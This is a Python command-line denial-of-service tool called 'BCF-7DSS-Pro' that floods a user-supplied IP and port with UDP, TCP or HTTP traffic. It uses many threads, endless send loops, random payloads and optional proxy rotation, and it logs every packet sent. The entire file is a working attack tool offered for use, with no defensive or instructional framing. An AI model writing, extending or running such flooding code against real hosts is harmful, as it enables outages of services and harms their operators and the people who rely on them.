#!/usr/bin/env python3

import os
import time
import socket
import random
import threading
import argparse
import sys
from datetime import datetime
import requests

sent_packets = 0
lock = threading.Lock()

# ✅ Real-time logging
def log_attack(ip, port, mode):
    global sent_packets
    with lock:
        sent_packets += 1
        print(f"[+] Packet #{sent_packets} -> {ip}:{port} via {mode.upper()}")
        with open("bcf7dss_attack.log", "a") as f:
            f.write(f"[{datetime.now()}] #{sent_packets} -> {ip}:{port} [{mode.upper()}]\n")

# ✅ UDP flood
def udp_flood(ip, port, threads):
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    payload = random._urandom(1490)

    def send():
        while True:
            try:
                sock.sendto(payload, (ip, port))
                log_attack(ip, port, "udp")
            except:
                pass

    for _ in range(threads):
        threading.Thread(target=send, daemon=True).start()

# ✅ TCP flood
def tcp_flood(ip, port, threads):
    payload = random._urandom(1024)

    def send():
        while True:
            try:
                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                sock.connect((ip, port))
                sock.send(payload)
                sock.close()
                log_attack(ip, port, "tcp")
            except:
                pass

    for _ in range(threads):
        threading.Thread(target=send, daemon=True).start()

# ✅ HTTP flood
def http_flood(ip, threads, proxies=None):
    url = f"http://{ip}"

    def send():
        proxy = None
        if proxies:
            proxy = {"http": random.choice(proxies)}
        while True:
            try:
                requests.get(url, proxies=proxy, timeout=2)
                log_attack(ip, 80, "http")
            except:
                pass

    for _ in range(threads):
        threading.Thread(target=send, daemon=True).start()

# ✅ Proxy loader (optional)
def load_proxies():
    try:
        with open("proxies.txt", "r") as f:
            return [line.strip() for line in f if line.strip()]
    except:
        return []

# ✅ CLI Start
def start_attack(ip, port, mode, threads):
    print(f"\n[*] Starting {mode.upper()} attack on {ip}:{port} with {threads} threads...\n")
    time.sleep(1)
    if mode == "udp":
        udp_flood(ip, port, threads)
    elif mode == "tcp":
        tcp_flood(ip, port, threads)
    elif mode == "http":
        proxies = load_proxies()
        http_flood(ip, threads, proxies)
    else:
        print("[!] Invalid mode.")
        sys.exit(1)

# ✅ Entry point
def main():
    parser = argparse.ArgumentParser(description="🔥 BCF-7DSS-Pro CLI Tool")
    parser.add_argument("-ip", "--ip", required=True, help="Target IP Address")
    parser.add_argument("-p", "--port", type=int, default=80, help="Target Port")
    parser.add_argument("-m", "--mode", choices=["udp", "tcp", "http"], default="udp", help="Attack Mode")
    parser.add_argument("-t", "--threads", type=int, default=100, help="Number of Threads")
    args = parser.parse_args()

    start_attack(args.ip, args.port, args.mode, args.threads)

    # Keep alive
    try:
        while True:
            time.sleep(1)
    except KeyboardInterrupt:
        print("\n[!] Attack manually stopped.")
        sys.exit(0)

if __name__ == "__main__":
    main()